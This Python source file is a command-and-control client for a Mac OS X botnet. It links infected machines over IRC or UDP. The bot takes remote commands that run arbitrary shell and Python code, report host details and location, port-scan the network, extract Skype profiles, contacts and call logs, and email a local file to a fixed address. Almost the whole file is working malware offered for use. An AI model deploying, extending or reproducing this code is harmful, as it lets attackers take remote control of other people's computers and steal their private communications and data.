"""Mac botnet based on github.com/pirate/python-medusa which runs on the mesh platform"""

import sys
import time

sys.path.append("..")

# Mesh networking components
from node import Node
from links import IRCLink, UDPLink
from programs import RoutedProgram, R
from protocols import MeshIP

# Bot Modules
import skype
import network
import shell_tools
import identification
import communication

from settings import IRC_CONNECTIONS, NICK, VERSION, MAIN_USER

"""
Programs for network communication, discovery,
bot control, and identification are composed using inheritance,
and are then run on a node and passed incoming messages.
"""


class SwarmBot(RoutedProgram):
    """Program which handles discovery and communication with other bots"""
    router = RoutedProgram.router

    def __init__(self, node):
        super(SwarmBot, self).__init__(node)
        self.NEIGHBORS = {}

    def parse_arp(self, packet):
        node_info = packet.split('IAM ')[-1]
        mac_addr, name = node_info.split(';')
        return mac_addr, name

    @router.route(R('^NEIGHBORS'))
    def get_neighbors(self, packet, interface):
        self.send('DISCOVER', interface)

    @router.route(R('^DISCOVER'))
    def handle_arp_discover(self, packet, interface):
        self.send('IAM %s;%s' % (self.node.mac_addr, self.node.name), interface)

    @router.route(R('^IAM'))
    def handle_arp_reply(self, packet, interface):
        mac_addr, name = self.parse_arp(packet)
        self.NEIGHBORS[name] = mac_addr
        self.send('FRIENDS: %s' % self.NEIGHBORS, interface)


class MacBot(SwarmBot):
    """Program to accept and run common botnet commands on Mac OS X computers"""
    router = SwarmBot.router

    def __init__(self, node):
        node.name = NICK
        super(MacBot, self).__init__(node)

    @router.route(R('^!?reload'))
    def reload(self, message, interface):
        self.send('[*] Disconnecting...', interface)
        interface.stop()
        self.node.interfaces.remove(interface)

        interface = interface.__class__(interface.name, interface.port)
        interface.start()
        self.node.interfaces.append(interface)

        self.send('[√] Reconnected.', interface)

    @router.route(R('^!?version'))
    def get_version(self, message, interface):
        self.send(VERSION, interface)

    @router.route(R('^!?identify'))
    def identify(self, message, interface):
        self.send(identification.get_system_short(), interface)

    @router.route(R('^!?details'))
    def host_details(self, message, interface):
        self.send(identification.get_system_full(), interface)

    @router.route(R('^!?locate'))
    def locate(self, message, interface):
        self.send(str(geo_locate()), interface)

    @router.route(R('^!?status'))
    def status(self, message, interface):
        self.send(interface, interface)

    @router.route(R('^!?admin'))
    def make_admin(self, message, interface):
        global ADMINS
        to_make_admin = message.split('admin ', 1)[1].strip()
        if to_make_admin and to_make_admin not in ADMINS:
            ADMINS.append(to_make_admin)
        self.send('ADMINS: %s' % ','.join(ADMINS), interface)

    @router.route(R('^!?unadmin'))
    def unmake_admin(self, message, interface):
        global ADMINS
        to_unmake_admin = message.split('unadmin ', 1)[1].strip()
        ADMINS.remove(to_unmake_admin)
        self.send('ADMINS: %s' % ','.join(ADMINS), interface)

    @router.route(R('^\>\>\>'))
    def eval_python(self, message, interface):
        result = shell_tools.run_python(message[3:])
        self.send(result, interface)

    @router.route(R('^\$'))
    def eval_shell(self, message, interface):
        result = shell_tools.run_shell(message[1:])
        self.send(result, interface)

    @router.route(R('^!?skype$'))
    def skype_info(self, message, interface):
        for line in skype.get_profile_info(skype.find_profiles(MAIN_USER)):
            self.send(line, interface)

    @router.route(R('^!?skype_contacts$'))
    def skype_contacts(self, message, interface):
        for line in skype.get_contacts(skype.find_profiles(MAIN_USER)):
            self.send(line, interface)

    @router.route(R('^!?skype_calls$'))
    def skype_calls(self, message, interface):
        for line in skype.get_calls(skype.find_profiles(MAIN_USER)):
            self.send(line, interface)

    @router.route(R('^!?portscan'))
    def portscan(self, message, interface):
        for line in network.portscan():
            self.send(line, interface)

    @router.route(R('^!?email'))
    def email(self, message, interface):
        target = 'bot-test@sweeting.me'
        attachments = ['/Users/squash/.stats/commands.csv']
        result = communication.email(target, attachments=attachments)
        self.send(result, interface)


def setup():
    connections = [IRCLink(**config) for config in IRC_CONNECTIONS]       # production
    connections += [UDPLink('en1', 2012)]                                    # development
    node = Node(connections, NICK, Program=MacBot)

    [conn.start() for conn in connections]
    node.start()

    return node, connections


def runloop(node, connections):
    try:
        while True:
            message = input("\nEVAL:".ljust(31))
            print("------------------------------" + len(message) * '=')
            node.recv(bytes(message, 'UTF-8'), connections[0])
            time.sleep(0.1)

    except (EOFError, KeyboardInterrupt):   # CTRL-D, CTRL-C
        node.stop()
        [conn.stop() for conn in connections]


if __name__ == '__main__':
    node, connections = setup()
    runloop(node, connections)
